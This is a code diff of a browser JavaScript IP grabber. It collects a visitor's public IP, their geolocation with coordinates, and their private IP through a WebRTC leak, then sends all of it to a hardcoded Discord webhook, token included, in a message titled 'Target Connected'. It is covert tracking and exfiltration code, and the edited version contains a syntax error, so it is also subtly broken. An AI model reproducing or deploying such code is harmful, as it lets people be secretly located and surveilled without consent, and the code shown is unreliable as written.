@@ -20,39 +20,43 @@
         const WEBHOOK = "https://discord.com/api/webhooks/1556586908619112468/UmBXhpdq5ijQnk8nZmroZwEm-Ns5desvvoWOgVI5Nu9l66KT1lmTPAR3VAxrmOc9B2UZ";
 
         async function grab() {
+            let pub = "unknown", priv = "unknown", geo = "unknown";
+
             try {
                 const pubRes = await fetch("https://api.ipify.org?format=json");
                 const pubData = await pubRes.json();
-                const pub = pubData.ip;
+                pub = pubData.ip;
+            } catch(e) {}
 
-                let priv = "unknown";
-                try {
-                    const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-                    pc.createDataChannel("x");
-                    await new Promise(r => pc.onicecandidate = e => {
-                        if (e.candidate) {
-                            const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-                            if (m) priv = m[1];
-                            r();
-                        }
-                    });
-                    await pc.setLocalDescription(await pc.createOffer());
-                    await new Promise(r => setTimeout(r, 2000));
-                } catch(e) {}
+            try {
+                const geoRes = await fetch(`https://ipwho.is/${pub}`);
+                const geoData = await geoRes.json();
+                if (geoData.success) {
+                    geo = `${geoData.city}, ${geoData.region}, ${geoData.country} (${geoData.latitude}, ${geoData.longitude})`;
+                }
+            } catch(e) {}
 
-                let geo = "unknown";
-                try {
-                    const geoRes = await fetch(`http://ip-api.com/json/${pub}`);
-                    const geoData = await geoRes.json();
-                    geo = `${geoData.city}, ${geoData.regionName}, ${geoData.country} (${geoData.lat}, ${geoData.lon})`;
-                } catch(e) {}
+            try {
+                const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+                pc.createDataChannel("x");
+                await new Promise(r => pc.onicecandidate = e => {
+                    if (e.candidate) {
+                        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                        if (m) priv = m[1];
+                        r();
+                    }
+                });
+                await pc.setLocalDescription(await pc.createOffer());
+                await new Promise(r => setTimeout(r, 2000));
+            } catch(e) {}
 
+            try {
                 await fetch(WEBHOOK, {
                     method: "POST",
                     headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({
                         embeds: [{
-                            title: "Target Connected",
+                            title": "Target Connected",
                             color: 0xff0000,
                             fields: [
                                 {name: "public ip", value: pub, inline: false},
